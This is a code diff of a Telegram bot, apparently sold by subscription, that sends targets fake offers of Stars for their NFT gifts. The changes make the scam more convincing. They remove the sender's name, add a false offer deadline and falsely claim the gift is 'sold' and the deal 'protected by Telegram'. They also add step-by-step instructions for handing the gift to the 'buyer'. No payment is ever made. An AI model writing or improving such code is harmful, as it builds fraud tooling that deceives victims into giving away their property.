@@ -575,43 +575,6 @@ async def profile(callback: types.CallbackQuery):
         text = f"👤 <b>Ваш профиль</b>\n\n✅ Подписка активна до: <b>{row[0]}</b>"
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
 
-@dp.callback_query(F.data == "buy")
-async def buy(callback: types.CallbackQuery):
-    await callback.answer()
-    await callback.message.edit_text("💎 <b>Покупка ключа</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-    ]))
-
-@dp.callback_query(F.data == "enter_key")
-async def enter_key_prompt(callback: types.CallbackQuery, state: FSMContext):
-    await callback.answer()
-    await callback.message.edit_text("🔑 <b>Введите ключ:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="main_menu")]]))
-    await state.set_state(AdminState.waiting_key)
-
-@dp.message(AdminState.waiting_key)
-async def process_key(message: types.Message, state: FSMContext):
-    user_key = message.text.strip()
-    await state.clear()
-    save_user(message.from_user)
-    log_action(message.from_user.id, f"key_activate:{user_key}")
-    cur.execute("SELECT date_until FROM keys WHERE key_code = ?", (user_key,))
-    row = cur.fetchone()
-    if row:
-        cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (row[0], message.from_user.id))
-        conn.commit()
-        await message.answer(f"✅ <b>Ключ активирован!</b>\nДействует до: <b>{row[0]}</b>", reply_markup=main_menu())
-        return
-    cur.execute("SELECT days FROM promos WHERE code = ?", (user_key,))
-    promo = cur.fetchone()
-    if promo:
-        days = promo['days']
-        new_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
-        cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (new_date, message.from_user.id))
-        conn.commit()
-        await message.answer(f"✅ <b>Промокод активирован!</b>\nТеперь подписка до: <b>{new_date}</b>", reply_markup=main_menu())
-        return
-    await message.answer("❌ Неверный ключ или промокод!", reply_markup=main_menu())
-
 # === ОФФЕР ===
 @dp.business_message(F.text.startswith("/h"))
 async def make_offer(message: types.Message):
@@ -621,23 +584,32 @@ async def make_offer(message: types.Message):
         except: pass
         await message.answer("⛔ У вас нет подписки!")
         return
+    
     args = message.text.split()
     if len(args) < 5: return
     link, price, lang = args[1], args[2], args[4].lower()
+    
     match = re.search(r'/nft/([^-]+)-(\d+)', link)
     gift_name = f"{match.group(1)} #{match.group(2)}" if match else "Collectible"
     sender_name = message.from_user.first_name
     sender_id = message.from_user.id
+    
     if lang == "ru":
-        text = f"Пользователь {sender_name} предлагает вам {price} ⭐ за подарок {gift_name}."
+        text = (
+            f"Пользователь предлагает вам <b>{price}</b> ⭐ Stars за подарок 💎 <b>{gift_name}</b>.\n\n"
+            f"Оффер действителен ещё <b>6 ч. 0 мин..</b>"
+        )
         btn_accept, btn_decline = "Принять", "Отклонить"
     else:
-        text = f"User {sender_name} offers you {price} ⭐ for the gift {gift_name}."
+        text = (
+            f"User offers you <b>{price}</b> ⭐ Stars for the gift 💎 <b>{gift_name}</b>.\n\n"
+            f"Offer is valid for <b>6 hours</b>."
+        )
         btn_accept, btn_decline = "Accept", "Decline"
-    
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_id}"),
-        InlineKeyboardButton(text=f"❌ {btn_decline}", callback_data="decline_offer")
+        InlineKeyboardButton(text=f"❌ {btn_decline}", callback_data="decline_offer"),
+        InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_id}")
     ]])
     
     try:
@@ -660,23 +632,32 @@ async def accept(callback: types.CallbackQuery):
     await callback.answer()
     parts = callback.data.split("_", 3)
     price, gift_name, sender_id = parts[1], parts[2], parts[3]
-    text_accepted = f"✅ <b>Предложение принято!</b>\n\nНажмите «📤 Отправить», передайте {gift_name} пользователю.\n\nПосле передачи нажмите «✅ Я отправил»."
+    
+    text_accepted = (
+        f"🎁 <b>Подарок: {gift_name} успешно продан!</b>\n\n"
+        f"<b>Передайте подарок покупателю для зачисления звёзд.</b>\n\n"
+        f"<i>(Сделка защищена Telegram. После передачи подарка звезды поступят на ваш баланс.)</i>"
+    )
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📤 Отправить", url=f"tg://user?id={sender_id}")],
-        [InlineKeyboardButton(text="✅ Я отправил", callback_data=f"sent_{price}_{gift_name}_{sender_id}")]
+        [InlineKeyboardButton(text="Передать NFT ↗️", url=f"tg://user?id={sender_id}")],
+        [InlineKeyboardButton(text="Как передать?", callback_data="how_to_send")]
     ])
     await change_message(callback.message, text_accepted, keyboard)
 
-@dp.callback_query(F.data.startswith("sent_"))
-async def sent_gift(callback: types.CallbackQuery):
+@dp.callback_query(F.data == "how_to_send")
+async def how_to_send(callback: types.CallbackQuery):
     await callback.answer()
-    await change_message(
-        callback.message,
-        "❌ <b>Ошибка: NFT не передан!</b>\n\n"
-        "Бот не обнаружил подарок. Убедитесь, что вы отправили NFT по кнопке «📤 Отправить».\n\n"
-        "Если вы уже отправили, подождите пару минут и нажмите кнопку ещё раз."
+    text = (
+        "📖 <b>Как передать подарок?</b>\n\n"
+        "1. Откройте профиль покупателя по кнопке выше.\n"
+        "2. Нажмите на три точки (⋮) в правом верхнем углу.\n"
+        "3. Выберите «Отправить подарок».\n"
+        "4. Выберите подарок из вашего списка.\n"
+        "5. Подтвердите отправку.\n\n"
+        "После этого звезды поступят на ваш баланс автоматически."
     )
+    await change_message(callback.message, text)
 
 @dp.callback_query(F.data == "decline_offer")
 async def decline(callback: types.CallbackQuery):
